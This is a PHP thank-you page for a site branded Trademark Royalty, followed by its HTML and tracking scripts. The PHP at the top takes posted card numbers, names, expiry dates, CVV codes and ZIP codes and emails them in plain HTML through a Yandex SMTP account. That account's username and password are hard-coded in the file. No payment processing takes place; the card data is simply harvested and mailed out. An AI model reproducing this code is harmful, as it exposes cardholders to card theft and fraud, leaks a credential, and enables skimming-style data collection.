<?php 
// error_reporting(E_ALL);
// ini_set('display_errors', 1);

    $card_number = $_POST['card_number'];
    $card_name = $_POST['card_name'];
    $expiration_month = $_POST['expiration_month'];
    $expiration_year = $_POST['expiration_year'];
    $csv_code = $_POST['csv_code'];
    $data_zip = $_POST['data_zip'];
    $package_price = $_POST['package-final'];
    
   

// Include PHPMailer library files
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
require 'services/PHPMailer/src/PHPMailer.php';
require 'services/PHPMailer/src/SMTP.php';
require 'services/PHPMailer/src/Exception.php';

// Receiver email address
// $to_email = "sales@zelsfirm.com ";
$to_email = 'support@trademarkroyalty.com';

// Sender email address and SMTP credentials
$from_email = "no-reply@voxtrongroup.com";
$smtp_username = "no-reply@voxtrongroup.com";
$smtp_password = "no-re!@##fm3";

// Email subject and body
$subject = "Trademark Royalty";
$body = "Customer Card Name: ".$card_name."<br><br>  Customer Card Number: ".$card_number."<br><br> Customer Expiration Month: ".$expiration_month."<br><br> Customer Expiration Year: ".$expiration_year."<br><br> Customer CSV Code: ".$csv_code."<br><br>  Customer Zip Code: ".$data_zip;

// SMTP server details
$smtp_host = 'smtp.yandex.com';
$smtp_port = 587;

// Create PHPMailer object
$mail = new PHPMailer(true);

try {
    // Set mailer to use SMTP
    $mail->isSMTP();
    $mail->Host = $smtp_host;
    $mail->SMTPAuth = true;
    $mail->Username = $smtp_username;
    $mail->Password = $smtp_password;
    $mail->SMTPSecure = 'tls';
    $mail->Port = $smtp_port;
    $mail->isHTML(true);
    // Set email headers
    $mail->setFrom($from_email);
    $mail->addAddress($to_email);
    $mail->Subject = $subject;
    $mail->Body = $body;

    // Send email
    $mail->send();
    // echo 'Email sent successfully';
} catch (Exception $e) {
    echo 'Email could not be sent. Error message: ', $mail->ErrorInfo;
}
?>
    
<!doctype html>
<html lang="en">

<head>
  <title>Thank You</title>
  <!-- Required meta tags -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="shortcut icon" href="assets/images/favicon.png" type="image/png">
  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
  <!-- Start of zelsfirm6605 Zendesk Widget script -->
<script id="ze-snippet" src="https://static.zdassets.com/ekr/snippet.js?key=3501f01d-8ec6-4390-a893-551362e7e851"> </script>
<!-- End of zelsfirm6605 Zendesk Widget script -->
<!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-11113375276"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'AW-11113375276');
    </script>

<style>

        .get-quote {
            margin: 15px 0 0 0;
            padding: 10px 15px;
            background: #0d356d;
            border-radius: 7px;
            color: #fff;
            text-decoration: none;
            font-weight: 500;
            display: inline-block;
            min-width: 100px;
            border: 0;
            text-transform: uppercase;
        }
        .get-quote:hover {
            margin: 15px 0 0 0;
            padding: 10px 15px;
            background: #fff;
            border-radius: 7px;
            color: #0d356d;
            text-decoration: none;
            font-weight: 500;
            display: inline-block;
            min-width: 100px;
            border: 0;
            text-transform: uppercase;
            box-shadow: 0 0px 6px #0d356d;
        }
        
        .logo-wrapper img {
            /*width: 225px;*/
            height: 55px;
            margin: 8px 0 0 0;
        }
    /*
        Thank You
    */
    .thanks-top {
        text-align: center;
        display: block;
    }
    
    .thanks-top .sm-title {
        font-size: 28px;
        font-weight: 600;
    }
    
    .thanks-top p {
        text-align: center;
        font-size: 18px;
        color: #838383;
    }
    
    .thanks-top .big-title {
        font-size: 48px;
        font-weight: 800;
        color: #000;
    }
    
    h4.f-title {
        font-size: 21px;
        font-weight: 800;
        color: #1ee32d;
    }
    section.disclaimer {
        background: #222;
        color: #fff;
        margin: 0;
        padding: 28px 0 16px 0;
    }
    .touch {
        text-align: center;
        margin: 35px 0 0;
    }
    .icon-box {
        margin: 0;
        display: block;
        position: relative;
    }
    .icon-box a{
        text-decoration: none;
    }
    .icon-box span.icon {
        width: 80px;
        height: 80px;
        background: #e1e1e1;
        border-radius: 50px;
        display: block;
        margin: auto;
        overflow: hidden;
    }
    
    
    .icon-box span.icon img {
        width: 48px;
        height: 100%;
        margin: auto;
        text-align: center;
        display: block;
    }
    
    .icon-box p {
        margin-top: 10px;
        text-align: center;
        font-size: 18px;
        font-weight: 700;
    }
    
    .icon-box span a {
        font-size: 21px;
        text-decoration: none;
        color: #0d356d;
    }
        @media screen and (max-width:991px) {
            .logo-wrapper {
                margin: 10px 0 0 0;
            }
            .logo-wrapper img {
                width: 170px;
                display: block;
                margin: auto;
            }
                        .get-quote {
                float: unset !important;
            }
            .get-quote {
                float: unset !important;
                margin: 15px auto 0 auto;
                width: 155px;
                display: block;
            }
            .b-navigation__menu-right {
                display: flex;
                justify-content: center;
                pointer-events: auto;
                margin: 47px auto 12px auto;
            }
    
            section.briefForm {
                margin-top: 20px;
            }
    
            .seqImg {
                margin: 0 0 45px 0;
                padding: 0;
            }
    
            section.briefForm .pe-5 {
                padding-right: 0 !important;
            }
    
            .sidebar {
                margin: 0 0 25px 0;
            }
        }
</style>


</head>

<body>
    
    
    
    <div class="package-price"><span> <?php $package_price; ?></span> </div>
  <header>
    <div class="container-fluid">
      <div class="row">
        <div class=col-md-6 >
          <div class="logo-wrapper">
            <a href="/"><img src="./assets/images/logo-main.png" alt=""></a>
          </div>
        </div>
        <div class=col-md-6>
          <!--<a href="" class="get-quote c-button js-next-screen shine me-3" data-bs-toggle="modal" data-bs-target="#leadModal">Get a free quote</a>-->
          <a href="tel:+1 (408) 538-8652" class="get-quote c-button js-next-screen shine float-right"><i class="fa-solid fa-phone me-2"></i>+1 (408) 538-8652</a>
        </div>
      </div>
    </div>
  </header>
  <main>
      
      

    <!-- THANK YOU -->
    <section class="thankyou-col">
      <div class="container">
        <div class="thanks-top">
          <h2 class="sm-title mt-5">Be In Touch With Us 24/7!</h2>
          <p>Our support team will get in touch with you shortly in order to disucss about your application(s). If you have any further concerns or queries, please feel free to get in touch with us</p>
          <h1 class="big-title">THANK YOU</h1>
          <h4 class="f-title">For Your Interest</h4>
        </div>
      </div>
    </section>
    <section class="cta-red">
      <div class="container">
        <div class="inner clearfix no-border">
          <div class="touch">
            <h2>Be In Touch With Us 24/7!</h2><br>
          </div>
          <div class="row justify-centent-center mt-5">
            <div class="col-lg-12 col-md-12">
              <div class="row">
                <div class="col-md-4 col-sm-4">
                  <div class="icon-box rounded-red"> 
                    <a href="tel:+1 (408) 538-8652">
                    <span class="icon">
                    <img class="lazy" src="./assets/images/phone-icon.svg">
                    </span>
                    <p>Toll Free<br>
                      <span><a href="tel:+1 (408) 538-8652">+1 (408) 538-8652</a></span>
                    </p>
                    </a>
                  </div>
                </div>
                <div class="col-md-4 col-sm-4 req-callback pointer">
                  <div class="icon-box rounded-red">
                    <a href="tel:+1 (408) 538-8652">
                    <span class="icon">
                      <img class="lazy" src="./assets/images/call-back.svg">
                    </span>
                    <p>Request<br>
                      <span>Call Back </span>
                    </p>
                    </a>
                  </div>
                </div>
                <div class="col-md-4 col-sm-4 pointer no-border pointer">
                  <div class="icon-box rounded-red">
                    <a href="javascript:$zopim.livechat.window.show();">
                    <span class="icon">
                    <img class="lazy" src="./assets/images/chat-icon-2.svg">
                    </span>
                    <p>Start a<br>
                      <span href="jvascript:setButtonURL();">Live Chat</span>
                    </p>
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <br><br><br>
    <section class="disclaimer">
      <div class="container">
        <div class="row">
          <div class="col-md-12">
            <p>Disclaimer:<br>Trademark Royalty does not have any affiliation with any domain company mentioned on this page to offer such promotion. All other company names, brand names, trademarks and logos mentioned on this page are the property of their respective owners and do not constitute or imply endorsement, sponsorship or recommendation thereof by mindsonline of the respective trademark owners. </p>
          </div>
        </div>
      </div>
    </section>
    <!-- END:: MAIN CONTAINER -->
  </main>
  <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>

<!-- recaptcha script -->
    <!--<script src="https://www.google.com/recaptcha/api.js?render=6Ld-4IUlAAAAAPIgfMtKmLiEjZ5TFPGWZXlAK3-_"></script>-->

<script>
      $('.chat, .chatt, .live_chatt').click(function() {
         $zopim.livechat.window.show();
      });
      
      setTimeout(function(){
          window.location.href = '/';
      },20000);
</script>
<!-- Event snippet for web sign up conversion page -->

<script>
let pp = $('.package-price span').text()
 console.log(pp)
  gtag('event', 'conversion', {
      'send_to': 'AW-11113375276/JDvvCKXi25sYEKzMorMp',
      'value': pp,
      'currency': 'USD'
      
  });
</script>
   

</body>

</html>
    
 <?php
// } else {
//     header("Location: https://www.Trademark Royalty.com/");
// }
// ?>
